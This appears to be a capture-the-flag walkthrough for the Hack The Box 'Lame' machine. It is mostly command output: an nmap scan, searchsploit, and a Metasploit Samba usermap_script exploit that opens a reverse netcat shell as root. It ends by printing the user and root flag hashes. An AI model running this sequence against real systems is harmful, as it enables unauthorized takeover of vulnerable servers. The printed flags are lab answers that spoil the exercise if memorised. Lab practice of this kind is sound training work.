# Lame -https://www.hackthebox.com/machines/Lame
```bash
nmap -sV -sC -Pn 10.129.62.93        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-16 03:22 EDT
Nmap scan report for 10.129.62.93
Host is up (0.052s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.56
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-05-16T03:23:45-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m36s, deviation: 2h49m45s, median: 33s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.30 seconds
```
```bash
searchsploit samba 3.0.20 
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                            | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                  | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                             | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                     | linux_x86/dos/36741.py
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
```bash
msfconsole
```
```bash
msf6 > search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
```
```bash
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
```
```bash
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.56
LHOST => 10.10.14.56
msf6 exploit(multi/samba/usermap_script) > set RHOST 10.129.62.93
RHOST => 10.129.62.93
```
```bash
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.56:4444 
[*] Command shell session 1 opened (10.10.14.56:4444 -> 10.129.62.93:58734) at 2024-05-16 03:47:26 -0400
```
```bash
id
uid=0(root) gid=0(root)
whoami
root
pwd
/
```
```bash
cd home 
ls
ftp
makis
service
user
cd makis
ls
user.txt
cat user.txt
fbf9e3bc5c4c2a6164f339598fab00b7
```
```bash
cd ..
cd ..
cd ..
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
317334ca02140a4ba622b994d8c4c617
```
